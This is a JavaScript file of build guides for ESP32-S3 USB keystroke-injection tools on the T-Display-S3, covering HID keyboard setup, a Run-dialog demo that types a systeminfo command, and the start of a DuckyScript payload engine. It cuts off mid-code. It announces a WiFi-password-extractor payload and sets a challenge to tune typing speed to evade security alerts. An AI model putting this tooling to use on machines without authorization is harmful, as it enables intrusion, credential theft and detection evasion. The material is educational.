// ============================================================================
// Signal ESP32-S3 Arsenal — Build Guides (sg-93 through sg-102)
// Native USB security tools on the LILYGO T-Display-S3
// ============================================================================

window.SignalGuides = {

    // ========================================================================
    // SG-93: T-Display-S3 Setup & Your First USB Device
    // ========================================================================
    'sg-93': {
        intro: '<p>The ESP32-S3 changes everything. Unlike the standard ESP32, the S3 has <strong>native USB OTG</strong> &mdash; it can present itself as a keyboard, mouse, flash drive, or network adapter to any computer it plugs into. Combined with WiFi and Bluetooth 5, it is a complete security research platform in a device smaller than your thumb.</p>' +
               '<p>In this project you will set up the LILYGO T-Display-S3, configure the development environment, display text on the built-in 1.9" TFT screen, and make the board appear as a USB keyboard that types a message. This is the foundation for every project that follows.</p>' +
               '<p>The T-Display-S3 has a 170x320 ST7789 TFT, two programmable buttons, USB-C with native USB OTG, WiFi, Bluetooth 5 (BLE), and 16MB flash. All for about $18.</p>',

        wiring: '    No external wiring required.\n' +
                '    The T-Display-S3 is an all-in-one board.\n' +
                '    Just connect USB-C to your computer.\n' +
                '\n' +
                '    Board Pinout Reference:\n' +
                '    TFT: ST7789 170x320 (hardwired)\n' +
                '    Buttons: GPIO 0 (BOOT), GPIO 14 (USER)\n' +
                '    USB: Native USB OTG on GPIO 19 (D-) and GPIO 20 (D+)\n' +
                '    Battery: JST 1.25mm connector for LiPo',

        wiringNotes: '<p><strong>No external wiring needed.</strong> The T-Display-S3 is a complete development board. The TFT, buttons, and USB are all integrated on the PCB.</p>' +
                     '<p><strong>USB Mode:</strong> The board has two USB modes: CDC (serial, for programming and debug output) and OTG (for presenting as HID/MSC/network devices). You select the mode in your code.</p>' +
                     '<p><strong>Safety:</strong> When the board is configured as a USB keyboard (HID mode), it will type whatever you program it to. Always test on YOUR OWN machine first. Never deploy on systems you do not own or have written authorization to test.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 680 300" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs><pattern id="sg93-grid" width="20" height="20" patternUnits="userSpaceOnUse"><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern></defs>' +
            '<rect width="680" height="300" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="660" height="280" fill="url(#sg93-grid)" rx="4"/>' +
            '<text x="340" y="28" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-93 T-DISPLAY-S3 OVERVIEW</text>' +
            '<!-- Board outline -->' +
            '<rect x="180" y="50" width="320" height="200" rx="12" fill="#1e2736" stroke="#a855f7" stroke-width="2"/>' +
            '<rect x="180" y="50" width="320" height="28" rx="12" fill="rgba(168,85,247,0.12)"/>' +
            '<text x="340" y="69" text-anchor="middle" fill="#c084fc" font-size="11" font-weight="700">LILYGO T-Display-S3</text>' +
            '<!-- TFT Screen -->' +
            '<rect x="220" y="90" width="100" height="140" rx="6" fill="#0a1628" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<text x="270" y="130" text-anchor="middle" fill="#60a5fa" font-size="8" font-weight="600">ST7789</text>' +
            '<text x="270" y="145" text-anchor="middle" fill="#8b949e" font-size="7">170x320</text>' +
            '<text x="270" y="160" text-anchor="middle" fill="#8b949e" font-size="7">1.9 inch TFT</text>' +
            '<!-- ESP32-S3 chip -->' +
            '<rect x="350" y="100" width="120" height="60" rx="6" fill="rgba(168,85,247,0.1)" stroke="#a855f7" stroke-width="1"/>' +
            '<text x="410" y="125" text-anchor="middle" fill="#c084fc" font-size="8" font-weight="700">ESP32-S3</text>' +
            '<text x="410" y="140" text-anchor="middle" fill="#8b949e" font-size="6">WiFi + BT5 + USB OTG</text>' +
            '<!-- USB-C port -->' +
            '<rect x="315" y="238" width="50" height="14" rx="4" fill="#333" stroke="#8b949e" stroke-width="1"/>' +
            '<text x="340" y="268" text-anchor="middle" fill="#8b949e" font-size="7">USB-C</text>' +
            '<!-- Buttons -->' +
            '<circle cx="200" y="245" r="8" fill="#1a1f2b" stroke="#22c55e" stroke-width="1.5"/>' +
            '<text x="200" y="268" text-anchor="middle" fill="#22c55e" font-size="6">BOOT</text>' +
            '<circle cx="480" y="245" r="8" fill="#1a1f2b" stroke="#eab308" stroke-width="1.5"/>' +
            '<text x="480" y="268" text-anchor="middle" fill="#eab308" font-size="6">USER</text>' +
            '<!-- Feature callouts -->' +
            '<rect x="30" y="90" width="130" height="80" rx="6" fill="rgba(34,197,94,0.06)" stroke="rgba(34,197,94,0.15)" stroke-width="0.5"/>' +
            '<text x="95" y="108" text-anchor="middle" fill="#22c55e" font-size="8" font-weight="600">KEY FEATURES</text>' +
            '<text x="40" y="124" fill="#8b949e" font-size="7">Native USB OTG</text>' +
            '<text x="40" y="138" fill="#8b949e" font-size="7">WiFi 802.11 b/g/n</text>' +
            '<text x="40" y="152" fill="#8b949e" font-size="7">Bluetooth 5 (BLE)</text>' +
            '<text x="40" y="166" fill="#8b949e" font-size="7">16MB Flash</text>' +
            '<rect x="530" y="90" width="130" height="80" rx="6" fill="rgba(239,68,68,0.06)" stroke="rgba(239,68,68,0.15)" stroke-width="0.5"/>' +
            '<text x="595" y="108" text-anchor="middle" fill="#ef4444" font-size="8" font-weight="600">USB MODES</text>' +
            '<text x="540" y="124" fill="#8b949e" font-size="7">CDC: Serial debug</text>' +
            '<text x="540" y="138" fill="#8b949e" font-size="7">HID: Keyboard/Mouse</text>' +
            '<text x="540" y="152" fill="#8b949e" font-size="7">MSC: Flash Drive</text>' +
            '<text x="540" y="166" fill="#8b949e" font-size="7">RNDIS: Network</text>' +
            '</svg></div>',

        steps: [
            {
                title: 'Install PlatformIO and Configure the Board',
                content: '<p>Install PlatformIO as a VS Code extension. Create a new project with board <code>lilygo-t-display-s3</code> and framework <code>arduino</code>. If that board is not listed, use <code>esp32-s3-devkitc-1</code> and configure manually.</p>' +
                         '<p>In <code>platformio.ini</code>, configure for USB OTG support:</p>',
                code: '[env:t-display-s3]\nplatform = espressif32\nboard = lilygo-t-display-s3\nframework = arduino\nmonitor_speed = 115200\nbuild_flags = \n    -DARDUINO_USB_MODE=1\n    -DARDUINO_USB_CDC_ON_BOOT=1\n    -DBOARD_HAS_PSRAM\nlib_deps = \n    bodmer/TFT_eSPI@^2.5.0\n    ; For USB HID:\n    espressif/esp32-usb\nupload_speed = 921600',
                language: 'INI',
                tip: '<strong>ARDUINO_USB_MODE=1</strong> enables native USB (OTG mode). Without this flag, the USB port only works as a serial connection through the CH340 chip. This is the single most important build flag for all S3 security projects.'
            },
            {
                title: 'Configure TFT_eSPI for the ST7789 Display',
                content: '<p>The TFT_eSPI library needs a User_Setup.h file configured for the T-Display-S3. Create this file in the library folder or use build flags:</p>',
                code: '// User_Setup.h for LILYGO T-Display-S3\n#define ST7789_DRIVER\n#define TFT_WIDTH  170\n#define TFT_HEIGHT 320\n\n// T-Display-S3 pin assignments\n#define TFT_CS    6\n#define TFT_DC    7\n#define TFT_RST   5\n#define TFT_MOSI  3\n#define TFT_SCLK  2\n#define TFT_BL    38\n\n#define TFT_BACKLIGHT_ON HIGH\n\n// Font includes\n#define LOAD_GLCD\n#define LOAD_FONT2\n#define LOAD_FONT4\n#define LOAD_FONT6\n#define LOAD_FONT7\n#define LOAD_FONT8\n#define LOAD_GFXFF\n#define SMOOTH_FONT\n\n#define SPI_FREQUENCY 40000000',
                language: 'C++',
                tip: '<strong>Pin assignments are specific to the T-Display-S3.</strong> Other ESP32-S3 boards will have different pin mappings. Always check your board schematic.'
            },
            {
                title: 'Hello World on the Display',
                content: '<p>Verify the display works with a simple test. This sketch fills the screen with the Hexworth color scheme and displays text.</p>',
                code: '#include <TFT_eSPI.h>\n\nTFT_eSPI tft = TFT_eSPI();\n\nvoid setup() {\n    Serial.begin(115200);\n    \n    // Initialize display\n    tft.init();\n    tft.setRotation(1);  // Landscape\n    tft.fillScreen(TFT_BLACK);\n    \n    // Turn on backlight\n    pinMode(TFT_BL, OUTPUT);\n    digitalWrite(TFT_BL, HIGH);\n    \n    // Display boot message\n    tft.setTextColor(0xA55F, TFT_BLACK);  // Purple\n    tft.setTextSize(2);\n    tft.setCursor(20, 40);\n    tft.println("HEXWORTH PRIME");\n    \n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setTextSize(1);\n    tft.setCursor(20, 80);\n    tft.println("ESP32-S3 Arsenal");\n    tft.println("SG-93: Setup Complete");\n    \n    tft.setTextColor(0x07E0, TFT_BLACK);  // Green\n    tft.setCursor(20, 120);\n    tft.println("Display: OK");\n    tft.println("USB OTG: Ready");\n    tft.println("WiFi: Standby");\n    tft.println("BLE: Standby");\n    \n    Serial.println("SG-93: T-Display-S3 initialized");\n}\n\nvoid loop() {\n    // Nothing yet\n    delay(1000);\n}',
                language: 'C++',
                tip: null
            },
            {
                title: 'Your First USB Keyboard Device',
                content: '<p>Now the critical step &mdash; make the ESP32-S3 appear as a USB keyboard. When plugged into any computer, the host will see a new keyboard device. The board can then send keystrokes as if a human were typing.</p>' +
                         '<p>This uses the ESP32-S3 native USB stack with the TinyUSB HID class.</p>',
                code: '#include <TFT_eSPI.h>\n#include "USB.h"\n#include "USBHIDKeyboard.h"\n\nTFT_eSPI tft = TFT_eSPI();\nUSBHIDKeyboard Keyboard;\n\nconst int BTN_USER = 14;  // User button on T-Display-S3\n\nvoid setup() {\n    Serial.begin(115200);\n    \n    // Initialize display\n    tft.init();\n    tft.setRotation(1);\n    tft.fillScreen(TFT_BLACK);\n    pinMode(TFT_BL, OUTPUT);\n    digitalWrite(TFT_BL, HIGH);\n    \n    // Initialize USB keyboard\n    Keyboard.begin();\n    USB.begin();\n    \n    // Setup button\n    pinMode(BTN_USER, INPUT_PULLUP);\n    \n    // Display status\n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setTextSize(2);\n    tft.setCursor(20, 40);\n    tft.println("USB KEYBOARD");\n    tft.setTextSize(1);\n    tft.setCursor(20, 80);\n    tft.setTextColor(0x07E0, TFT_BLACK);\n    tft.println("Status: ARMED");\n    tft.println("");\n    tft.println("Press USER button to type");\n    tft.println("message on host computer.");\n    tft.println("");\n    tft.setTextColor(TFT_YELLOW, TFT_BLACK);\n    tft.println(">> Test on YOUR machine only");\n}\n\nvoid loop() {\n    if (digitalRead(BTN_USER) == LOW) {\n        // Button pressed - type the message\n        tft.fillRect(20, 140, 280, 20, TFT_BLACK);\n        tft.setTextColor(TFT_RED, TFT_BLACK);\n        tft.setCursor(20, 140);\n        tft.println("TYPING...");\n        \n        delay(500);  // Brief delay for host to be ready\n        \n        Keyboard.println("Hello from ESP32-S3!");\n        Keyboard.println("This was typed by USB HID.");\n        \n        tft.fillRect(20, 140, 280, 20, TFT_BLACK);\n        tft.setTextColor(0x07E0, TFT_BLACK);\n        tft.setCursor(20, 140);\n        tft.println("DONE - message sent");\n        \n        delay(2000);  // Debounce\n    }\n}',
                language: 'C++',
                tip: '<strong>USB.begin()</strong> starts the native USB stack. <strong>Keyboard.begin()</strong> registers the HID keyboard descriptor. The host computer sees a new keyboard device within seconds of plugging in. No drivers needed &mdash; every OS supports USB HID keyboards natively. This is why USB HID injection is such a powerful technique.'
            },
            {
                title: 'Understanding CDC vs HID vs MSC',
                content: '<p>The ESP32-S3 native USB can present as different device classes. Understanding these is critical for the rest of the arsenal:</p>' +
                         '<ul>' +
                         '<li><strong>CDC (Communications Device Class):</strong> Serial port. Used for programming and debug output. The default mode.</li>' +
                         '<li><strong>HID (Human Interface Device):</strong> Keyboard, mouse, gamepad. The host trusts HID devices implicitly &mdash; no driver installation, no prompts. This is what makes USB injection attacks possible.</li>' +
                         '<li><strong>MSC (Mass Storage Class):</strong> Flash drive. The board appears as a removable disk. Combined with HID, you can auto-execute files from the "drive."</li>' +
                         '<li><strong>RNDIS/ECM (Network):</strong> The board appears as a USB network adapter. The host routes traffic through it &mdash; enabling interception.</li>' +
                         '</ul>' +
                         '<p>In the following projects, you will use each of these classes to build a complete security research toolkit.</p>',
                code: null,
                language: null,
                tip: '<strong>Why HID is trusted:</strong> Operating systems assume that USB keyboards and mice are controlled by a human. They do not prompt for permission or require drivers. A USB HID device can send keystrokes at machine speed &mdash; hundreds of characters per second &mdash; executing commands faster than any human could type. This implicit trust is the fundamental vulnerability that USB injection tools exploit.'
            },
            {
                title: 'Button-Controlled Demo with Display Feedback',
                content: '<p>Combine everything: display shows a menu, button triggers the action, USB sends the keystrokes, display confirms completion. This is the pattern for every tool in the arsenal.</p>',
                code: '#include <TFT_eSPI.h>\n#include "USB.h"\n#include "USBHIDKeyboard.h"\n\nTFT_eSPI tft = TFT_eSPI();\nUSBHIDKeyboard Keyboard;\n\nconst int BTN_BOOT = 0;   // Boot button\nconst int BTN_USER = 14;  // User button\n\nint selectedOption = 0;\nconst int NUM_OPTIONS = 3;\nconst char* options[] = {\n    "1. Type Hello",\n    "2. Open Notepad (Win)",\n    "3. System Info"\n};\n\nvoid drawMenu() {\n    tft.fillScreen(TFT_BLACK);\n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setTextSize(2);\n    tft.setCursor(20, 10);\n    tft.println("S3 ARSENAL");\n    \n    tft.setTextSize(1);\n    for (int i = 0; i < NUM_OPTIONS; i++) {\n        tft.setCursor(20, 50 + i * 20);\n        if (i == selectedOption) {\n            tft.setTextColor(TFT_BLACK, TFT_CYAN);\n        } else {\n            tft.setTextColor(TFT_WHITE, TFT_BLACK);\n        }\n        tft.println(options[i]);\n    }\n    \n    tft.setTextColor(TFT_YELLOW, TFT_BLACK);\n    tft.setCursor(20, 130);\n    tft.println("BOOT=navigate  USER=execute");\n}\n\nvoid executeOption(int opt) {\n    tft.setTextColor(TFT_RED, TFT_BLACK);\n    tft.setCursor(20, 150);\n    tft.println("Executing...");\n    delay(300);\n    \n    switch (opt) {\n        case 0:  // Hello\n            Keyboard.println("Hello from ESP32-S3 Arsenal!");\n            break;\n        case 1:  // Open Notepad\n            Keyboard.press(KEY_LEFT_GUI);\n            Keyboard.press(\'r\');\n            Keyboard.releaseAll();\n            delay(500);\n            Keyboard.println("notepad");\n            delay(500);\n            Keyboard.println("Typed by the ESP32-S3 Arsenal");\n            break;\n        case 2:  // System Info\n            Keyboard.press(KEY_LEFT_GUI);\n            Keyboard.press(\'r\');\n            Keyboard.releaseAll();\n            delay(500);\n            Keyboard.println("cmd /k systeminfo | findstr /B /C:\\"OS Name\\" /C:\\"OS Version\\" /C:\\"System Type\\"");\n            break;\n    }\n    \n    tft.fillRect(20, 150, 280, 15, TFT_BLACK);\n    tft.setTextColor(0x07E0, TFT_BLACK);\n    tft.setCursor(20, 150);\n    tft.println("Done!");\n}\n\nvoid setup() {\n    Keyboard.begin();\n    USB.begin();\n    \n    tft.init();\n    tft.setRotation(1);\n    pinMode(TFT_BL, OUTPUT);\n    digitalWrite(TFT_BL, HIGH);\n    \n    pinMode(BTN_BOOT, INPUT_PULLUP);\n    pinMode(BTN_USER, INPUT_PULLUP);\n    \n    drawMenu();\n}\n\nvoid loop() {\n    if (digitalRead(BTN_BOOT) == LOW) {\n        selectedOption = (selectedOption + 1) % NUM_OPTIONS;\n        drawMenu();\n        delay(300);\n    }\n    \n    if (digitalRead(BTN_USER) == LOW) {\n        executeOption(selectedOption);\n        delay(1000);\n        drawMenu();\n    }\n}',
                language: 'C++',
                tip: '<strong>This is the skeleton for every tool in the arsenal.</strong> Menu on display, button navigation, action execution. In the following projects, you will replace the simple options with WiFi scanning, BLE tools, and advanced USB payloads.'
            }
        ],

        testing: '<p>Verify each stage:</p>' +
                 '<ul>' +
                 '<li><strong>PlatformIO:</strong> Project compiles without errors. Board is detected on USB.</li>' +
                 '<li><strong>Display:</strong> TFT shows the boot message with correct colors and text alignment.</li>' +
                 '<li><strong>USB HID:</strong> Open a text editor on your computer, press the USER button, and see text appear as if typed by a keyboard.</li>' +
                 '<li><strong>Menu system:</strong> BOOT button cycles through options, USER button executes the selected option.</li>' +
                 '<li><strong>Device Manager:</strong> Your computer should show a new "HID Keyboard Device" when the board is plugged in.</li>' +
                 '</ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>Board not detected by PlatformIO:</strong> Hold the BOOT button while plugging in USB-C. This forces the S3 into download mode. Release after plugging in.</li>' +
                         '<li><strong>Display is blank:</strong> Check TFT_BL pin (38) is set HIGH. Verify TFT_eSPI User_Setup.h pin assignments match the T-Display-S3.</li>' +
                         '<li><strong>USB HID not working:</strong> Make sure <code>ARDUINO_USB_MODE=1</code> is in your build flags. Without this, the USB port runs as CDC serial only.</li>' +
                         '<li><strong>"USB Device Not Recognized" on host:</strong> The TinyUSB stack may not have initialized properly. Add a <code>delay(2000)</code> at the start of setup() to give the USB stack time to enumerate.</li>' +
                         '<li><strong>Keyboard types wrong characters:</strong> USB HID uses US keyboard layout by default. If your host uses a different layout, some characters may map incorrectly.</li>' +
                         '<li><strong>Cannot upload after USB HID code:</strong> The native USB takes over from CDC. Hold BOOT button while resetting to re-enter download mode.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: OS Detection</strong> &mdash; Before typing, detect which operating system the host is running (check USB descriptors or timing behavior) and adjust keyboard shortcuts accordingly (Win+R for Windows, Cmd+Space for macOS, Ctrl+Alt+T for Linux).</p>' +
                    '<p><strong>Challenge 2: Payload File System</strong> &mdash; Store multiple payload scripts on SPIFFS (the S3 flash filesystem). The display shows a file browser, and you select which payload to execute. Add the ability to create new payloads over WiFi.</p>' +
                    '<p><strong>Challenge 3: Stealth Timing</strong> &mdash; Instead of typing at machine speed, add randomized delays between keystrokes to mimic human typing patterns. Measure how fast different typing speeds are before triggering security software alerts.</p>',

        stepVisuals: {
            3: '<svg viewBox="0 0 680 120" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace;display:block;width:100%">' +
               '<rect width="680" height="120" fill="#0d1117" rx="6"/>' +
               '<text x="340" y="18" text-anchor="middle" fill="#444" font-size="8" font-weight="700" letter-spacing="0.15em">USB DEVICE CLASS COMPARISON</text>' +
               '<rect x="20" y="30" width="150" height="75" rx="4" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.3)" stroke-width="1"/>' +
               '<text x="95" y="48" text-anchor="middle" fill="#22c55e" font-size="8" font-weight="700">CDC (Serial)</text>' +
               '<text x="95" y="64" text-anchor="middle" fill="#8b949e" font-size="6.5">Debug output</text>' +
               '<text x="95" y="78" text-anchor="middle" fill="#8b949e" font-size="6.5">Programming</text>' +
               '<text x="95" y="92" text-anchor="middle" fill="#555" font-size="6">Default mode</text>' +
               '<rect x="185" y="30" width="150" height="75" rx="4" fill="rgba(239,68,68,0.08)" stroke="rgba(239,68,68,0.3)" stroke-width="1"/>' +
               '<text x="260" y="48" text-anchor="middle" fill="#ef4444" font-size="8" font-weight="700">HID (Keyboard)</text>' +
               '<text x="260" y="64" text-anchor="middle" fill="#8b949e" font-size="6.5">Keystroke injection</text>' +
               '<text x="260" y="78" text-anchor="middle" fill="#8b949e" font-size="6.5">No driver needed</text>' +
               '<text x="260" y="92" text-anchor="middle" fill="#555" font-size="6">Implicitly trusted</text>' +
               '<rect x="350" y="30" width="150" height="75" rx="4" fill="rgba(59,130,246,0.08)" stroke="rgba(59,130,246,0.3)" stroke-width="1"/>' +
               '<text x="425" y="48" text-anchor="middle" fill="#3b82f6" font-size="8" font-weight="700">MSC (Storage)</text>' +
               '<text x="425" y="64" text-anchor="middle" fill="#8b949e" font-size="6.5">Flash drive emulation</text>' +
               '<text x="425" y="78" text-anchor="middle" fill="#8b949e" font-size="6.5">File delivery</text>' +
               '<text x="425" y="92" text-anchor="middle" fill="#555" font-size="6">Auto-run risk</text>' +
               '<rect x="515" y="30" width="150" height="75" rx="4" fill="rgba(168,85,247,0.08)" stroke="rgba(168,85,247,0.3)" stroke-width="1"/>' +
               '<text x="590" y="48" text-anchor="middle" fill="#a855f7" font-size="8" font-weight="700">RNDIS (Network)</text>' +
               '<text x="590" y="64" text-anchor="middle" fill="#8b949e" font-size="6.5">Network adapter</text>' +
               '<text x="590" y="78" text-anchor="middle" fill="#8b949e" font-size="6.5">Traffic intercept</text>' +
               '<text x="590" y="92" text-anchor="middle" fill="#555" font-size="6">MITM capable</text>' +
               '</svg>'
        },

        componentCallouts: {
            svg: '<svg viewBox="0 0 560 180" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace;display:block;width:100%">' +
                 '<rect width="560" height="180" fill="#0d1117" rx="6"/>' +
                 '<text x="280" y="18" text-anchor="middle" fill="#444" font-size="8" font-weight="700" letter-spacing="0.14em">SG-93 COMPONENTS</text>' +
                 '<rect x="20" y="30" width="240" height="60" rx="6" fill="#0f1a2e" stroke="#a855f7" stroke-width="1.5"/>' +
                 '<text x="140" y="52" text-anchor="middle" fill="#c084fc" font-size="8" font-weight="700">LILYGO T-Display-S3</text>' +
                 '<text x="140" y="68" text-anchor="middle" fill="#8b949e" font-size="6.5">ESP32-S3 + 1.9" TFT + USB OTG</text>' +
                 '<text x="140" y="82" text-anchor="middle" fill="#555" font-size="6">$18 | All-in-one board</text>' +
                 '<rect x="300" y="30" width="240" height="60" rx="6" fill="#0f1a2e" stroke="#3b82f6" stroke-width="1.5"/>' +
                 '<text x="420" y="52" text-anchor="middle" fill="#60a5fa" font-size="8" font-weight="700">USB-C Cable</text>' +
                 '<text x="420" y="68" text-anchor="middle" fill="#8b949e" font-size="6.5">Data cable (not charge-only)</text>' +
                 '<text x="420" y="82" text-anchor="middle" fill="#555" font-size="6">Must support USB 2.0 data</text>' +
                 '</svg>',
            components: [
                {
                    id: 't-display-s3',
                    name: 'LILYGO T-Display-S3',
                    purpose: 'ESP32-S3 development board with integrated 1.9 inch ST7789 TFT display (170x320), two programmable buttons, USB-C with native USB OTG, WiFi 802.11 b/g/n, Bluetooth 5 (BLE), 16MB flash, and optional LiPo battery connector. The native USB OTG is the key differentiator from standard ESP32 boards.',
                    specs: ['ESP32-S3 dual-core 240MHz', '16MB Flash, 8MB PSRAM', 'ST7789 170x320 TFT', 'USB OTG (GPIO 19/20)', 'WiFi + BT5', '~$18']
                },
                {
                    id: 'usb-cable',
                    name: 'USB-C Data Cable',
                    purpose: 'Connects the T-Display-S3 to your computer for programming and USB device emulation. Must be a data cable, not a charge-only cable. Charge-only cables have no data wires and will not work for programming or USB HID.',
                    specs: ['USB 2.0 data support', 'USB-C connector', 'Not charge-only']
                }
            ]
        },

        commonMistakes: [
            {
                title: 'Using a Charge-Only USB-C Cable',
                correct: 'Use a USB-C cable that supports data transfer. Data cables are slightly thicker and have 4 wires inside (2 power + 2 data). Test by checking if the board appears as a serial device in Device Manager.',
                incorrect: 'Using the thin USB-C cable that came with a phone charger. Many cheap cables only carry power (2 wires) and cannot transfer data.',
                consequence: 'The board gets power (LED lights up) but is invisible to PlatformIO and cannot be programmed. You spend hours troubleshooting drivers when the cable is the problem.'
            },
            {
                title: 'Missing ARDUINO_USB_MODE Build Flag',
                correct: 'Include <code>-DARDUINO_USB_MODE=1</code> in your platformio.ini build_flags. This enables the native USB OTG stack on the ESP32-S3.',
                incorrect: 'Compiling without the USB mode flag. The default mode uses the USB port only for CDC serial through the onboard USB-serial converter.',
                consequence: 'The code compiles and uploads, but <code>USB.begin()</code> and <code>Keyboard.begin()</code> silently fail. The board never appears as a HID device on the host. No error message is shown.'
            },
            {
                title: 'Testing USB HID Payloads on the Wrong Machine',
                correct: 'Always test on YOUR OWN computer first. Open a text editor and verify the keystrokes appear correctly before demonstrating. Keep payloads simple and reversible during development.',
                incorrect: 'Plugging the board into a lab computer, classroom machine, or any system you do not have explicit authorization to test on.',
                consequence: 'The board types commands immediately on plug-in. If the payload opens a terminal and runs commands, you have just executed unauthorized actions on someone else\'s machine. This can result in disciplinary action, legal consequences, or damage to systems.'
            }
        ]
    }

},

    // ========================================================================
    // SG-94: USB Keystroke Injection — Advanced Payloads
    // ========================================================================
    'sg-94': {
        intro: '<p>In SG-93 you made the ESP32-S3 type a simple message. Now you will build a full keystroke injection framework &mdash; a DuckyScript-compatible payload engine that reads scripts from the flash filesystem, displays a selection menu on the TFT, and executes multi-step command sequences on the target machine.</p>' +
               '<p>This is how professional USB security assessment tools work. Understanding the technique is essential for building detection systems that protect against it.</p>' +
               '<p>You will create three safe demonstration payloads: a system information collector, a text file creator, and a WiFi password extractor (displays saved WiFi passwords on Windows). All payloads are educational and reversible.</p>',

        wiring: '    No external wiring required.\n    Same T-Display-S3 board from SG-93.\n    USB-C connection to target machine.',

        wiringNotes: '<p><strong>No external wiring.</strong> Same board as SG-93.</p>' +
                     '<p><strong>Authorization:</strong> USB keystroke injection is a penetration testing technique. Only use on systems you own or have explicit written permission to test. Unauthorized use may violate computer fraud laws.</p>' +
                     '<p><strong>Safety:</strong> Always review your payload before execution. A typo in a command sequence could delete files, change settings, or lock accounts. Test on a virtual machine first.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 680 200" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs><pattern id="sg94-grid" width="20" height="20" patternUnits="userSpaceOnUse"><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern></defs>' +
            '<rect width="680" height="200" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="660" height="180" fill="url(#sg94-grid)" rx="4"/>' +
            '<text x="340" y="28" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-94 USB KEYSTROKE INJECTION FLOW</text>' +
            '<!-- S3 Board -->' +
            '<rect x="40" y="60" width="160" height="100" rx="8" fill="#1e2736" stroke="#a855f7" stroke-width="1.5"/>' +
            '<text x="120" y="85" text-anchor="middle" fill="#c084fc" font-size="9" font-weight="700">T-Display-S3</text>' +
            '<text x="120" y="100" text-anchor="middle" fill="#8b949e" font-size="7">Payload stored</text>' +
            '<text x="120" y="114" text-anchor="middle" fill="#8b949e" font-size="7">in SPIFFS flash</text>' +
            '<rect x="60" y="125" width="120" height="20" rx="3" fill="rgba(239,68,68,0.1)" stroke="#ef4444" stroke-width="0.5"/>' +
            '<text x="120" y="139" text-anchor="middle" fill="#ef4444" font-size="7" font-weight="600">SELECT PAYLOAD</text>' +
            '<!-- Arrow -->' +
            '<line x1="210" y1="110" x2="300" y2="110" stroke="#eab308" stroke-width="2"/>' +
            '<polygon points="295,106 305,110 295,114" fill="#eab308"/>' +
            '<text x="255" y="100" text-anchor="middle" fill="#eab308" font-size="7">USB HID</text>' +
            '<text x="255" y="125" text-anchor="middle" fill="#555" font-size="6">Keystrokes at</text>' +
            '<text x="255" y="135" text-anchor="middle" fill="#555" font-size="6">machine speed</text>' +
            '<!-- Target -->' +
            '<rect x="310" y="60" width="160" height="100" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<text x="390" y="85" text-anchor="middle" fill="#60a5fa" font-size="9" font-weight="700">TARGET PC</text>' +
            '<text x="390" y="100" text-anchor="middle" fill="#8b949e" font-size="7">Sees a USB keyboard</text>' +
            '<text x="390" y="114" text-anchor="middle" fill="#8b949e" font-size="7">Trusts input implicitly</text>' +
            '<text x="390" y="132" text-anchor="middle" fill="#ef4444" font-size="7">Commands execute as</text>' +
            '<text x="390" y="146" text-anchor="middle" fill="#ef4444" font-size="7">logged-in user</text>' +
            '<!-- Defense box -->' +
            '<rect x="500" y="60" width="160" height="100" rx="8" fill="rgba(34,197,94,0.06)" stroke="#22c55e" stroke-width="1.5"/>' +
            '<text x="580" y="85" text-anchor="middle" fill="#22c55e" font-size="9" font-weight="700">DEFENSE</text>' +
            '<text x="580" y="104" text-anchor="middle" fill="#8b949e" font-size="6.5">USB device policies</text>' +
            '<text x="580" y="118" text-anchor="middle" fill="#8b949e" font-size="6.5">HID keystroke timing</text>' +
            '<text x="580" y="132" text-anchor="middle" fill="#8b949e" font-size="6.5">USB port lockdown</text>' +
            '<text x="580" y="146" text-anchor="middle" fill="#8b949e" font-size="6.5">Endpoint detection</text>' +
            '</svg></div>',

        steps: [
            {
                title: 'Build the Payload Engine',
                content: '<p>Create a DuckyScript-compatible parser that reads payload files from SPIFFS (the ESP32-S3 flash filesystem). Each payload is a text file with simple commands: STRING (type text), DELAY (wait), GUI (Windows key), ENTER, etc.</p>',
                code: '#include <TFT_eSPI.h>\n#include "USB.h"\n#include "USBHIDKeyboard.h"\n#include <SPIFFS.h>\n\nTFT_eSPI tft = TFT_eSPI();\nUSBHIDKeyboard Keyboard;\n\n// DuckyScript command processor\nvoid processLine(String line) {\n    line.trim();\n    if (line.length() == 0 || line.startsWith("REM")) return;\n    \n    if (line.startsWith("STRING ")) {\n        Keyboard.print(line.substring(7));\n    }\n    else if (line == "ENTER") {\n        Keyboard.press(KEY_RETURN);\n        Keyboard.releaseAll();\n    }\n    else if (line.startsWith("DELAY ")) {\n        delay(line.substring(6).toInt());\n    }\n    else if (line == "GUI r" || line == "WINDOWS r") {\n        Keyboard.press(KEY_LEFT_GUI);\n        Keyboard.press(\'r\');\n        Keyboard.releaseAll();\n    }\n    else if (line == "GUI") {\n        Keyboard.press(KEY_LEFT_GUI);\n        Keyboard.releaseAll();\n    }\n    else if (line == "CTRL ALT t") {\n        Keyboard.press(KEY_LEFT_CTRL);\n        Keyboard.press(KEY_LEFT_ALT);\n        Keyboard.press(\'t\');\n        Keyboard.releaseAll();\n    }\n    else if (line == "ALT F4") {\n        Keyboard.press(KEY_LEFT_ALT);\n        Keyboard.press(KEY_F4);\n        Keyboard.releaseAll();\n    }\n    else if (line == "TAB") {\n        Keyboard.press(KEY_TAB);\n        Keyboard.releaseAll();\n    }\n    else if (line == "ESCAPE") {\n        